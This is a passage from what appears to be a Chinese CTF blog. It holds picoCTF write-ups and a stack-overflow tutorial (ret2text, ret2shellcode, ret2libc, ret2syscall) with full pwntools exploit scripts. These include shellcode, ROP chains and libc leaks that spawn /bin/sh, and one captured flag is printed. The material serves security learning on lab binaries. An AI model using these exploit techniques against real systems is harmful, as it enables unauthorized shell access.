() &#123; char player_turn[100]; srand(time(0));//电脑的出拳设计 int r; printf(&quot;Please make your selection (rock/paper/scissors):\\n&quot;);//校验 r = tgetinput(player_turn, 100); if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; int computer_turn = rand() % 3;//确保在3个手势中随机选择一个 printf(&quot;You played: %s\\n&quot;, player_turn); printf(&quot;The computer played: %s\\n&quot;, hands[computer_turn]); if (strstr(player_turn, loses[computer_turn])) &#123;//核验我们所出的是否包含胜利所需要底色那个手势 puts(&quot;You win! Play again?&quot;); return true; &#125; else &#123; puts(&quot;Seems like you didn&#x27;t win this time. Play again?&quot;); return false; &#125;&#125; 所以我们要经过5次循环，且每次循环都要向程序输出rock&#x2F;paper&#x2F;scissors的结合 脚本12345678from pwn import *p = remote(&#x27;saturn.picoctf.net&#x27;, 60179)for i in range(5): p.sendline(b&#x27;1&#x27;) p.sendline(b&#x27;rock/paper/scissors&#x27;)print(p.recvline_contains(b&#x27;picoCTF&#123;&#x27;)) basic-file-exploit 漏洞题目信息 提供的程序允许您写入文件并从中读取您写入的内容。试着玩弄它，看看你是否能打破它！可以下载带有标记已编辑的程序源代码 这里 解密 有分析可得tgetinput用来校验空输入等基本校验工作，data_write数据输入，data_read数据读取，且其中包含flag的输出 由main可以知道。首先选择要进行的模式，且第一次必须先存入，否则无法调用data_read函数 123456789101112131415161718192021222324252627static void data_read() &#123; char entry[4]; long entry_number; char output[100]; int r; memset(output, &#x27;\\0&#x27;, 100); printf(&quot;Please enter the entry number of your data:\\n&quot;); r = tgetinput(entry, 4); // Timeout on user input if(r == -3) &#123; printf(&quot;Goodbye!\\n&quot;); exit(0); &#125; if ((entry_number = strtol(entry, NULL, 10)) == 0) &#123;//尝试将 entry 字符串的开头部分解析成一个十进制的长整型数值， puts(flag); fseek(stdin, 0, SEEK_END); exit(0); &#125; entry_number--; strncpy(output, data[entry_number], input_lengths[entry_number]); puts(output);&#125; 所以重点就是((entry_number = strtol(entry, NULL, 10)) == 0)的输出结果为0 flag:picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F} buffer overflow 0题目信息 让我们从简单的开始，你能溢出正确的缓冲区吗？该程序可在此处获得。您可以查看源代码 这里 。 解密 主函数 signal(11, sigsegv_handler)当程序发生段错误（即收到信号 11，也就是 SIGSEGV）时，不执行默认操作（崩溃），而是跳转到你定义的 sigsegv_handler 函数进行处理。 当你的程序试图访问非法内存地址（如未分配的内存、只读内存、已释放的内存等）时，操作系统会发送这个信号给程序。 默认情况下，收到 SIGSEGV 会导致程序崩溃（段错误）。 示例触发原因： 解引用空指针：*NULL 写入常量字符串：strcpy(&quot;hello&quot;, &quot;world&quot;) 越界访问栈数组、堆数组 使用未初始化的指针 这个对flag.txt文件的操作 相当于bin&#x2F;sh后门函数 它包含了读取flag,并把flag输出在终端 而在 Linux&#x2F;Unix 系统中，/bin/sh 是一个指向系统默认 shell（如 Bash）的可执行文件 sigsegv_handler函数 该函数会输出flag 所以只需要实现就可以输出flag 脚本1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 62318)p.sendline(b&#x27;a&#x27;*20)p.interactive() buffer overflow 1题目描述 控制退货地址现在我们开始烹饪了！您可以溢出缓冲区并返回到程序中的 flag 函数。你可以在这里查看源代码。 解密 var_4 是什么？ 在汇编或反编译工具（如 IDA Pro）中，var_4 是一个由工具自动生成的名称，用于表示一个位于栈上的局部变量。它通常是原始C代码中没有明确命名的变量，或者是编译器为了优化或内部使用而创建的栈空间。 从图片中可以看到，var_4 位于 s 数组的下方（在栈帧中，局部变量通常从 EBP 往下分配）。 var_4 有多大？ 图片中 var_4 对应的汇编指令是 dd ?。 dd 在汇编中是 “Define Doubleword” 的缩写。在 32 位系统中，一个 Doubleword 是 4 字节。 因此，var_4 的大小是 4 字节。 所以垃圾字节要填充36+4+4&#x3D;44个字节 win是后门函数 填充它的地址 脚本1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive() buffer overflow 2题目描述 控制返回地址和参数这一次，您需要控制您返回的函数的参数！您可以从此程序中获取标志吗？你可以在这里查看源代码 解密 s距离返回地址是6C+4个字节 要传参，32位是参数从右到左依次压入栈中 win的地址 gdb动调查看python wp.py 执行的函数列表 脚本1234567891011from pwn import *# 本地# ex = process(&#x27;./vuln&#x27;)# 远程p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall()) x-sixty-what题目描述 溢出 x64 代码在此之前的大多数问题是 32 位 x86。现在我们考虑 64 位 x86，它 只是有点不同！使缓冲区溢出，并将返回地址更改为 flag 函数。 下载源代码 。 解密 这一题我错了很久，最后发现考了堆栈平衡:crying_cat_face: 但是也学到了一些gdb调试获取信息的方法 gdb调试获得相关信息 readelf -s vuln显示所有函数的信息（在gdb调试之前） p flag：显示函数flag的信息 （gdb）disassemble vuln：找要填充的字节数（） 64位时是0x40+8 32位时是0x40+4 堆栈平衡同一个程序的每一个 call 指令执行时，rsp（栈指针）的绝对值不一定相同，但其对齐状态是保持一致的。 当 vuln 函数通过 ret 指令跳转到 flag 函数时，flag 函数的入口处 rsp (栈指针) 可能满足 rsp % 16 == 0 (即 16 字节对齐)。但是，flag 函数的序言 (prologue) 通常会 push rbp (将 rbp 压栈)，这会使 rsp 减去 8 字节，导致 rsp % 16 == 8 (8 字节不对齐)。 问题就出在这里：在执行任何 call 指令之前，rsp 必须是 16 字节对齐的。 所以该函数到flag之前要先到ret小工具 使用 ROPgadget (推荐)： 在终端中运行（确保你的 vuln 可执行文件在当前目录）： Bash 1ROPgadget --binary ./vuln --only &quot;ret&quot; 它会列出所有独立的 ret 指令地址。通常你可以选择其中一个地址最小的，或者你觉得“独立”的地址（例如，不在任何重要函数的中间）。0x0040101a 是一个非常常见的备选。 在 GDB&#x2F;pwndbg 中手动查找： 启动 GDB 调试 ./vuln，然后使用 search-pattern 命令查找 ret 指令的机器码 \\xc3： Code snippet 1search-pattern &#x27;\\xc3&#x27; 你也可以使用 disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; 来反汇编整个代码段，然后手动查找 ret。 直接看出堆栈不平衡 该函数是flag被调用函数输出flag，所以在flag函数中的第一个call的地方下断点 python 你的脚本文件名.py：运行脚本 info registers rsp：查看rsp的寄存器信息 看最后两位 0x48可以整除16，所以现在堆栈平衡了 脚本12345678910111213141516171819from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# 之前找到的 flag 函数地址flag_address = 0x00401236 # 在你的二进制文件中找到一个 ret 小工具的地址# 假设你找到的是 0x0040101a，请替换为你在 GDB/ROPgadget 中找到的实际地址ret_gadget_address = 0x0040101a # 构建 payload：填充 + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"初识栈溢出","slug":"初识栈溢出","date":"2025-07-05T04:06:13.000Z","updated":"2025-09-02T09:19:16.069Z","comments":true,"path":"2025/07/05/初识栈溢出/","permalink":"http://example.com/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"fun(a,b)调用过程入栈 （1）压入参数 根据调用约定，main函数作为调用者，首先需要将func函数的两个参数a,b压入栈中。 注意压入参数的顺序，首先压入b，接着压入a，也就是说，压入参数的顺序是从右到左。 （2）返回地址压栈 返回地址压栈。main函数为了让func函数调用后正常返回，需要将当前指令（call指令）的下一条指令的地址压入栈中 call指令包含两个步骤：main函数的下一条指令压栈；控制eip为func函数的第一条语句，eip存储着CPU将要执行的指令的地址 （3）func函数运行 func函数需要自己的内部运作空间。可以使用以下指令序列开辟空间：push ebp mov ebp,esp sub esp,28h 这个28h就是开辟的存储func函数的相关内存的空间 mov ebp,esp看似没有变化，但EBP 从“保存调用者基址”变为“当前函数的栈帧基址”。 （4）func函数的局部变量和参数 func函数有自己内部的运作空间，即func_ebp到func_esp 局部变量在编译之后会被表示为与ebp 不同的距离 v2被表示为ebp -18h，v3被表示为ebp -10h。 注意，这里的v2, v3和v4都是局部变量。参数的读取方式例子:第一个参数是ebp+8，第二个参数是ebp+12 因为调用约定，肯定有main_next和main_ebp在ebp的上方，故偏移是固定的，在返回地址main_next上面 然后，func函数返回。两个步骤：清除栈空间，返回到之前执行的指令（main_next）处。 (5)func函数返回步骤1:清除栈空间 每个函数清除栈空间时可以使用一条公用指令leave。 leave包含两个步骤： ①mov esp,ebp将栈顶设置为栈基，即将func_ebp到func_esp的内容全部出栈； ②pop ebp 将main_ebp的内容重新弹回ebp，使main函数的栈基址得到恢复 (6)func函数返回步骤2：返回之前执行的指令（main_next）处 每个函数返回时可以使用一条公用指令ret。ret包含一个步骤：将栈顶弹出到eip寄存器（即下一条指令的位置），达到恢复main函数执行顺序的 目的。 到这里，main函数的栈基址和下一条指令都得到了恢复，也就完成了整个func函数的调用。 Linux操作系统的保护 Arch:amd64-64-little： amd64即x86_64(CPU架构) 64即字长为64，返回地址在栈中占 8字节，32位是4字节） little表示小端序，如果是big则表示大端序。以数字0x12345678为例，小端序存储的是\\x78\\x56\\x34\\x12，大端序存储的是\\x12\\x34\\x56\\x78 RELRO：Partial RELRO: Partial RELRO和Full RELRO的区别可以简单理解为GOT写权限的区别，Partial RELRO相当于GOT可写，Full RELRO相当于GOT不可写。 NX：NX enabled: 如果开启了NX保护机制，那么w权限和x权限就是互斥的,即不存在既拥有写权限又拥有执行权限的段。这个保护机制是用来防止shellcode植入的。在gdb调试中，可以通过vmmap命令来查看每个段的权限。 PIE：No PIE（0x8048000） ret2text(覆盖返回地址)该函数内存在get漏洞 该函数泄露了后门函数 接着通过gets函数栈溢出将这个地址改为target，那么vulnfunc返回的时候，用ret指令取出栈顶的元素返回，就会返回到target这个函数 target函数中有system（”&#x2F;bin&#x2F;sh”）这个后门，类似于在Linux的终端直接调用&#x2F;bin&#x2F;sh。利用这种方式可以直接返回一个shell，进而得到目标主机的shell，拿到控制权。 找填充字节 直接从IDA中读出长度 s到vulnfunc的ebp的距离是108h，所以到main_next的距离是0x108+4 那个4是32位的ebp的空间 脚本1234567from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive() ret2shellcode（覆盖返回地址到Shellcode）Shellcode是机器码格式的恶意代码，指的是用于完成某个功能的汇编代码，常用的功能是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要求对应的二进制文件没有开启NX保护 printf(&quot;%p\\n&quot;, s)输出了S的缓冲区的位置 没有开启NX保护 所以可以向进程中写入一段Shellcode（利用w写权限），再执行这段Shellcode（利用x执行权限）。 脚本1234567891011from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # 修改为字节串target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # 修改为字节串sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive() context.arch = &quot;i386&quot;说明程序的架构，使用 asm() 函数将 shellcode (shellcraft.sh()) 汇编成机器码时，pwntools 需要知道目标架构是 32 位还是 64 位，以便生成正确的指令集。32 位和 64 位的指令是不同的。 target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) 接收知道读取到&#x2F;n，(输出的缓冲区的地址)，转化为十六进制整数，且drop = True方便地清理你接收到的数据。只提取某个模式（比如一个地址、一个数字或一个特定的字符串）而不包含用于分隔或终止的字符（如换行符、空格、冒号等） sc = asm(shellcraft.sh())生成启动/bin/sh的机器码 payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) 从右到左入栈，p32(target):覆盖返回地址，b’a’ * (0x108 + 4 - len(sc)):填充从sc结束位置到返回地址之间所有“无用”的栈空间。sc:当 sc位于缓冲区的起始位置。 context(arch &#x3D; ‘amd64’, os &#x3D; ‘linux’, log_level &#x3D; ‘debug’) 这种context的信息可以通过指令file+文件名 得到 输出示例： 1mrctf2020_shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, … 这里关键的信息： ELF → 说明是 Linux 64-bit → 说明是 64 位 x86-64 → 架构就是 amd64（pwntools 里写 amd64） 如果输出是： 1ELF 32-bit LSB executable, Intel 80386 那你就用： 1context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;) 如果是： 1ELF 32-bit LSB executable, ARM 那你就用： 1context(arch=&#x27;arm&#x27;, os=&#x27;linux&#x27;) ropNX 保护 (No-Execute): 它的唯一目的是阻止你在数据区域（比如栈和堆）执行代码。你可以把栈和堆想象成一块“只写数据，不能跑程序”的区域。 允许什么？ 允许你在栈上写数据（比如填充字符串 AAAA，或者一些地址）。 允许你修改寄存器的值。 允许你覆盖返回地址。 阻止什么？ 阻止你把自己的汇编代码（我们称之为 Shellcode）放在栈上，然后让程序去执行它。 ret2libc1（单个函数的rop来链）第一步，先看保护 get溢出 system函数存在,但参数不是&#x2F;bin&#x2F;sh system函数存在,并且程序中心存在bin&#x2F;sh字符串 所以可以把bin&#x2F;sh作为参数传入system函数中构造后门函数 要构造一个后门函数，先调用system函数，然后按照调用流程，参数（bin&#x2F;sh字符串所在的位置）入栈，返回地址入栈 payload的形式是**[垃圾填充] + [system函数地址] + [system返回地址] + [binsh字符串地址]** 脚本12345678910111213from pwn import *context.arch = &quot;i386&quot; # 强烈建议加上这一行p = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # 调试时启用#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # 确保这个地址确实包含 &quot;/bin/sh&quot; 字符串p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive() 找到system函数位置 elf = ELF(&quot;./ret2libc1&quot;) system = elf.plt[&quot;system&quot;]直接找到systemd的入口 注意 [system返回地址] 不能乱写，后门函数执行结束后会返回这个地址，错误的地址会引发崩溃 1.elf.plt[&quot;exit&quot;] (最常用，推荐)： 作用：让 system(&quot;/bin/sh&quot;) 执行完毕后，程序能够干净地调用 exit() 函数并退出。这是最推荐的做法，因为它确保了程序的正常终止。 优点：稳定、可靠，不会导致崩溃。 获取方式：elf.plt[&quot;exit&quot;] (pwntools 会自动解析)。 2.0x0 或其他无效地址 (导致崩溃)： 作用：如果你只关心 system(&quot;/bin/sh&quot;) 是否被执行，而不关心程序是否崩溃，那么可以随便填。 优点：最简单。 缺点：程序会崩溃，这在实际攻防中通常是不希望看到的。有时调试时为了快速验证 system 是否被调用，可能会暂时使用。 ret2libc2(两个函数的rop链) 该题没有bin&#x2F;sh字符串 所以我们要自己去通过get构造 (1)func函数通过栈溢出修改返回地址为gets_addr,传入get()的参数，b作为get函数底色参数，即其从终端读取的数据要存入的地方 （) （2）get函数被调用后会为自己开辟空间，执行时再次通过栈溢出填入system函数的地址和参数，最后调用system执行构造好的后门函数 分析之后得到应该构造如下形式的payload 其中get()函数和sys函数的参数都是bss段，get()用来把bin&#x2F;sh写入bss段，sys和它构成后门函数 get写入bss段的内容需要从终端读取，所以之后还要为其发送一个“bin&#x2F;sh” Payload的形式是p32（gets_addr）+p32（system_addr）+p32（gets_p1）+p32（system_p1）。 开启了NX保护，写和运行不能同时实现，所以改变该函数的参数位置，所以把 /bin/sh）写入一个可写的内存区域。.bss 段是一个非常理想的选择，因为它： 可写 通常位于固定的地址（特别是在 没有开启 ASLR 的情况下）； 在程序运行期间未初始化的数据都存储在这里。 找bss地址 1.readelf readelf -S ret2libc2 2.gdb调试 gdb ./ret2libc2 info files 显示了bss段的始末位置 3.脚本中直接得到 elf.bss() 脚本12345678910111213from pwn import *p = process(&quot;./ret2libc2&quot;)gdb.attach(p,&quot;b *0x08048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() gdb调试检查是否成功写入 c一下运行到下断点位置 这个时候第一个get已经实现，payload已经传入了 下一步会进入我们传进去的get中 get 和system函数都执行结束后 x/s 0x0804a040发现bss内存入了bin&#x2F;sh ret2libc2(多个函数的rop链)假设一个二进制文件里仅有read函数，read函数有三个参数（fd，addr和length） 这是按照两个rop链写出的payload填补形式 函数read因为拥有三个参数，所以相应地在栈上需要有三个块的空间。这时，system函数的第一个参数的位置就会和read函数的第二个参数的位置冲突，导致无法将system函数的第一个参数放置在栈上。不方便直接覆盖，因为read的参数限制比较多 所以这种情况就可以用pop&#x2F;ret进行 注意选取的基本原则：有几个参数就用几个pop指令，比如调用完gets函数之后，因为gets函数只有一个参数，所有可以将gets函数的返回地址改为0x0804862F，即只执行一个pop指令弹出参数之后就是ret指令；比如read函数有三个参数，那么就找0x0804862D这个位置，因为这个位置的指令是3个pop指令加上一个ret指令 如何寻找若干个pop指令跟着ret指令 ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot; (ROPgadget用于查找用来攻击的可执行代码片段，而readlf是程序的整体结构和内存布局) 脚本12345678910111213141516from pwn import *p = process(&quot;./ret2libc2&quot;)#gdb.attach(p,&quot;b *0x8048595&quot;)elf=ELF(&quot;./ret2libc2&quot;)sys=elf.plt[&quot;system&quot;]get=elf.plt[&quot;gets&quot;]bss=elf.bss()pop1_ret=0x804861bpayload=b&#x27;a&#x27;*(0x108+4)payload+=p32(get)+p32(pop1_ret)+p32(bss)payload+=p32(sys)+p32(pop1_ret)+p32(bss)p.sendline(payload)p.sendline(&quot;/bin/sh&quot;)p.interactive() payload += p32(get) + p32(pop1_ret) + p32(bss): 盘子比喻 准备 ROP 链（堆叠盘子）： 你在内存的栈上，从下往上（也就是从低地址往高地址，因为栈是向下增长的），像堆叠盘子一样放了一系列地址。 假设你的 ROP 链片段是：A (get地址), B (pop ebp; ret地址), C (bss地址)。 栈上的盘子： 1234... (其他数据)[ C 盘子 (bss地址) ] &lt;-- 位于栈上较高位置[ B 盘子 (pop ebp; ret地址) ][ A 盘子 (get地址) ] &lt;-- 位于栈上较低位置，最先被程序“看到” 当程序返回时，会先“拿起”最上面的盘子（A）。 执行 get 函数（使用 A 盘子）： 程序因为栈溢出被劫持，它会跳到 get 函数的地址（A 盘）。 get 函数开始执行。它需要一个参数，也就是一个内存地址来存放它读取的数据。 get 函数会去“看”它自己返回地址上方的“盘子”，也就是 C 盘子 (bss地址)。 所以，C 盘子 (bss地址) 被 get 函数当作了它的参数，get 会将你通过 p.sendline(&quot;/bin/sh&quot;) 发送的数据写入到 C 盘子 所指示的内存区域（即 bss 段）。 get 函数执行完毕后，它需要“返回”。它会从栈上取回它的返回地址，也就是紧邻其下的 B 盘子 (pop ebp; ret地址)。 执行 pop ebp; ret gadget（使用 B 盘子）： 程序跳转到 B 盘子 (pop ebp; ret地址)。 现在，B 盘子 内部的指令开始执行： pop ebp： 这条指令会“拿起”栈顶的那个盘子。此时栈顶就是 C 盘子 (bss地址)。所以，C 盘子 (bss地址) 会被弹出并放入 ebp 寄存器。这个操作相当于把 C 盘子 从栈中拿走了。 ret： 这条指令会“拿起”栈中现在最上面的盘子（也就是 C 盘子 被拿走后暴露出的下一个盘子），并跳转到那个盘子上的地址。这个盘子就是你 ROP 链中的下一个函数地址（例如 sys 函数的地址）。 ret2syscall(底层系统调用静态) 开启了NX保护，但我们可以通过精心构造ROP链实现跳转，而不改变数据段的数值 除此之外没有上面有效的东西了,整个二进制文件中都没有system函数 所以自己为寄存器赋值以构造后门函数。且调用的int 0x80要放在最上面，调用时，从下往上开始执行，执行到调用指令时，该函数的参数必须准备好、 根据命令找到&#x2F;bin&#x2F;sh字符段 和int 0x80的调用命令以及需要的pop|ret命令 脚本12345678910111213141516171819from pwn import *p = process(&quot;./ret2syscall&quot;)#gdb.attach(p,&quot;b *0x080488ED&quot;)binsh=0x080ea068int_0x80=0x0806ce55pop_eax_ret = 0x080b8526pop_edx_ecx_ebx_ret = 0x0806f200eax = 11 # #define __NR_ execve 11ebx = binshecx = 0edx = 0payload=b&#x27;a&#x27;*(0x108+4)payload+=p32(pop_eax_ret)+p32(eax)payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)payload+=p32(int_0x80)p.sendline(payload)p.interactive() 函数调用和系统调用 特点 函数调用 系统调用 面向 普通程序 内核 入口 call func syscall 指令 参数约定 System V ABI (RDI, RSI, RDX, RCX, R8, R9, …) Linux syscall ABI (RDI, RSI, RDX, R10, R8, R9) 调用对象 用户态的函数（可能是 libc 封装） 内核的服务（文件、进程、网络等） 返回位置 RAX RAX 使用场景 普通代码调用库函数 手写 shellcode、ROP 直接调用内核服务 编译知识（1）静态编译。编译器在编译可执行文件的时候，会提取可执行文件需要调用的对应的动态链接库（.so）中的部分，并链接到可执行文件中 去，使可执行文件在运行的时候不依赖于动态链接库。 （2）动态编译。动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库中的命令。所以，其优点一方面是 缩小了可执行文件的大小，优点加快了编译速度，节省了系统资源。缺点一方面是哪怕很简单的程序，只要用到了链接库中的一两条命令，也要附带一个庞大的链接库；另一方面是如果其他计算机上没有安装对应的运行库，则经过动态编译的可执行文件就不能运行。 静态编译的优缺点与动态编译正好相反。 静态编译可以简单理解为将动态链接库中的代码拷贝出来放入对应的二进制文件里。 寄存器 在32位系统中，通过int 0x80指令触发系统调用。其中，EAX寄存器用于传递系统调用号，参数按顺序赋值给EBX、ECX、EDX、ESI、 EDI、EBP这6个寄存器。 在64位系统中，使用syscall指令来触发系统调用，同样使用EAX（RAX）寄存器传递系统调用号，RDI、RSI、RDX、RCX、R8、R9 这6个寄存器用来传递参数。 eg:read（0,buf,0x100） 32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。 64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。 也是进入内核态执行。 如果想要完成Get shell 32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。 64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0; 在ida中红色为外部函数，白色为内部函数 静态编译的二进制文件全为内部函数 ret2libc3 脚本123456789101112131415161718192021222324252627282930313233343536373839from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)#gdb.attach(p, &quot;b *0x0804854C&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]main_addr = 0x0804854E# 泄露 gets 地址p.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)p.sendline(payload1)# 获取泄露地址leak_addr = u32(p.recv(4))# 用 LibcSearcher 查libc = LibcSearcher(&quot;gets&quot;, leak_addr)#LibcSearcher 会根据你提供的函数名和地址，去匹配已知的 libc 数据库libc_base = leak_addr - libc.dump(&quot;gets&quot;)#libc.dump(&quot;gets&quot;)是gets 函数在 libc 中的偏移（相对于 libc 基地址）system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))#输出这个计算出的地址，便于检查# 第二次攻击p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got) 调用put函数泄露gets函数的实际地址，并且返回main函数，再次利用got漏洞 它内部使用的是 预定义符号名 ，比如： &quot;system&quot; &quot;gets&quot; &quot;printf&quot; &quot;str_bin_sh&quot; （就是你要找的 /bin/sh） 这些名字不是随便写的，是预先在 libc 数据库中定义好的符号名称。 脚本执行后会显示 这是因为用libc &#x3D; LibcSearcher(“gets”, leak_addr)进行选择适合的libc库，但不同版本的libc.so文件的变化不大，一个函数的地址约束不够严格，所以会显示多个libc版本供选择 解决多个libc.so版本供选择1.多个约束条件 哪些符号最稳妥 这是个很重要的问题： 为什么泄露 gets &#x2F; puts &#x2F; printf，不泄露 malloc &#x2F; exit &#x2F; system 呢？ 理由： 符号 稳妥程度 原因 puts 👍 几乎每个 libc 里都有，偏移独特 printf 👍 常见，偏移独特 gets 👍（但是 glibc2.28+ 被废弃了） read 👍 核心 IO，存在且稳定 write 👍 和 read 对应 system 👎 很常用，但是有的 libc 把它静态链接了或者位置很常见 exit 👎 偏移较小且常见，不建议用 __libc_start_main 👍 非常稳妥，通常不会冲突 因此建议你泄露的优先级是： 1puts &gt; printf &gt; read &gt; write &gt; __libc_start_main &gt; gets 理想状态下，你一次性泄露三个符号，比如： 123puts(gets@got);puts(puts@got);puts(printf@got); 然后用三个符号去查库，几乎100%唯一 但是 当程序编译时，只有真正被调用的外部库函数才会被链接，并且它们才会在 GOT 表里有条目。 而你的目标程序 ./ret2libc3 里： 12bash复制编辑gets, puts 有用到printf 没用到 所以：只能有两个约束条件 123css复制编辑elf.got[&quot;gets&quot;] ✅ 存在elf.got[&quot;puts&quot;] ✅ 存在elf.got[&quot;printf&quot;] ❌ 报错 脚本 1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherp = process(&quot;./ret2libc3&quot;)elf = ELF(&quot;./ret2libc3&quot;)gets_got = elf.got[&quot;gets&quot;]puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]#puts的got表main_addr = 0x0804854Ep.recvuntil(&quot;ret2libc3\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)payload1 += p32(puts_plt) + p32(main_addr) + p32(puts_got)#输出puts的实际位置p.sendline(payload1)leak_addr = u32(p.recv(4))leak_puts = u32(p.recv(4))#接收其位置libc = LibcSearcher(&quot;gets&quot;, leak_addr)libc.add_condition(&quot;puts&quot;, leak_puts)#增加puts的位置作为约束条件libc_base = leak_addr - libc.dump(&quot;gets&quot;)system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;system: &quot; + hex(system_addr))log.success(&quot;/bin/sh: &quot; + hex(binsh_addr))p.recvuntil(&quot;ret2libc3\\n&quot;)payload2 = b&quot;a&quot; * 0x108 + b&quot;junk&quot;payload2 += p32(system_addr) +p32(0) + p32(binsh_addr)p.sendline(payload2)p.interactive() 但是这个我尝试过对这个题目来说还是约束条件太少，但是由于这个题目调用函数比较少，所以可以作为约束的函数也比较少 1）GOT。GOT是全局偏移量表（Global Offset Table），用于存储外部函数在内存中的确切地址。GOT存储在数据段（Data Segment）内，可以在程序运行过程中被修改。 2）PLT是程序链接表（Procedure Linkage Table），用来存储外部函数的入口点（entry），换言之，程序会到PLT中寻找外部函数的地址。PLT存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改。 简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限（在FULL RELRO保护机制开启的时候，没有读写权限）；PLT是外部函数的入口表，存储的是每个外部函数的代码，具有执行权限。 尽管 libc 的加载地址是随机的（ASLR），但在libc不同的情况下 libc 内部所有函数相对于 libc 基地址的偏移量是固定不变的。这是 ret2libc 攻击的基础。 实际地址&#x3D;基址+偏移 当你写了一个程序使用了 libc 中的函数（如 printf），这个函数的具体地址在编译时是未知的，因为 libc 被加载的位置会因 ASLR（地址空间布局随机化）而变化。 函数名称 内容 PLT 提供跳转桩代码 GOT 存放实际函数地址 当你的程序调用 printf() 时，实际上调用的是 PLT 中的 printf@plt，PLT 再通过 GOT 查找真正的地址。 🔁 总结对比（重点来了！） 为什么可以用 system@plt？ 因为它是 libc 中system()函数的“入口大门”，进去以后就会自动跳过去，不用你自己去找路。 为什么不用 GOT？ 因为我们不是要读取地址，而是要调用函数。PLT 就像按钮，按下去就能运行函数，不需要先看地址。 什么时候必须用 GOT？ 当你在远程服务器上不知道 libc 